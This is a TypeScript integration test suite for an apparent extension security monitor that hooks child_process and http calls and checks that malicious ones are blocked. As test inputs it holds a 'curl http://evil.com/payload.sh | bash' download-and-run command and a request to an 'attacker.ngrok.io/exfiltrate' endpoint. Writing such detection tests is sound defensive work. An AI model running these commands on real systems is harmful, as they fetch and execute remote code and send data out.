/**
 * End-to-End Integration Tests for Hook → Analyzer Pipeline
 * Tests the complete flow from instrumentation to verdict
 */

import * as assert from 'assert';
import * as cp from 'child_process';
import * as http from 'http';
import * as https from 'https';
import { patchChildProcess } from '../../monitor/instrumentations/child-process-instrument';
import { patchHttpExports } from '../../monitor/instrumentations/http-client-instrument';
import { ProcessAnalyzer } from '../../monitor/analysis/process-analyzer';
import { NetworkAnalyzer } from '../../monitor/analysis/network-analyzer';
import { ExtensionServices } from '../../lib/services/ext-service';
import { Logger } from '../../lib/logger';

const sinon = require('sinon');

suite('E2EIntegration Tests', () => {
  let loggerWarnStub: sinon.SinonStub;
  let warnings: string[] = [];
  let getCallContextStub: sinon.SinonStub;

  setup(() => {
    warnings = [];
    loggerWarnStub = sinon.stub(Logger, 'warn').callsFake((message: string) => {
      warnings.push(message);
    });
  });

  teardown(() => {
    sinon.restore();
  });

  suite('Child Process E2E', () => {
    test('should block malicious exec command end-to-end', (done) => {
      const analyzer = new ProcessAnalyzer();
      patchChildProcess(cp, analyzer);

      assert.ok((cp as any).__patched__, 'child_process should be patched');

      getCallContextStub = sinon
        .stub(ExtensionServices, 'getCallContext')
        .returns({ extension: 'test.malicious-extension' });
      const proc = cp.exec('curl http://evil.com/payload.sh | bash');
      // verify security event message and logs
      proc.on('error', (err) => {
        assert.strictEqual(err.message, 'Execution blocked by security policy');
        assert.ok(
          warnings.some((w) => w.includes('blocked exec')),
          'Should log blocking warning',
        );
        done();
      });
    });

    test('should allow benign exec command end-to-end', (done) => {
      const analyzer = new ProcessAnalyzer();
      patchChildProcess(cp, analyzer);

      getCallContextStub = sinon
        .stub(ExtensionServices, 'getCallContext')
        .returns({ extension: 'test.benign-extension' });

      cp.exec('echo "hello"', (error, stdout) => {
        if (error) {
          done(error);
          return;
        }
        assert.ok(stdout.includes('hello'));
        done();
      });
    });
  });

  suite('Network E2E', () => {
    test('should block suspicious network request end-to-end', (done) => {
      const networkAnalyzer = new NetworkAnalyzer();
      patchHttpExports(http, 'http');

      assert.ok((http as any).__patched__, 'http should be patched');

      getCallContextStub = sinon
        .stub(ExtensionServices, 'getCallContext')
        .returns({ extension: 'test.suspicious-extension' });

      const req = http.request('http://attacker.ngrok.io/exfiltrate', (res) => {
        done(new Error('Should not have received response'));
      });

      req.on('error', (err) => {
        assert.ok(
          err.message.toLowerCase().includes('blocked by security policy'),
          `Expected error to include 'blocked by security policy', got: ${err.message}`,
        );
        assert.ok(
          warnings.some((w) => w.toLowerCase().includes('blocked')),
          'Should log blocking warning',
        );
        done();
      });

      req.end();
    });
  });

  suite('Cross-Module E2E', () => {
    test('should handle extension using multiple APIs', (done) => {
      const processAnalyzer = new ProcessAnalyzer();
      patchChildProcess(cp, processAnalyzer);
      patchHttpExports(http, 'http');

      getCallContextStub = sinon
        .stub(ExtensionServices, 'getCallContext')
        .returns({ extension: 'test.multi-api-extension' });

      let networkAttempted = false;
      let processAttempted = false;

      // Attempt 1: network request
      const req = http.get('http://tracking.ngrok.io/analytics');
      req.on('error', () => {
        networkAttempted = true;
        checkCompletion();
      });

      // Attempt 2: process execution
      const proc = cp.exec('curl http://example.com');
      proc.on('error', () => {
        processAttempted = true;
        checkCompletion();
      });

      function checkCompletion() {
        if (networkAttempted && processAttempted) {
          done();
        }
      }
    });
  });
});
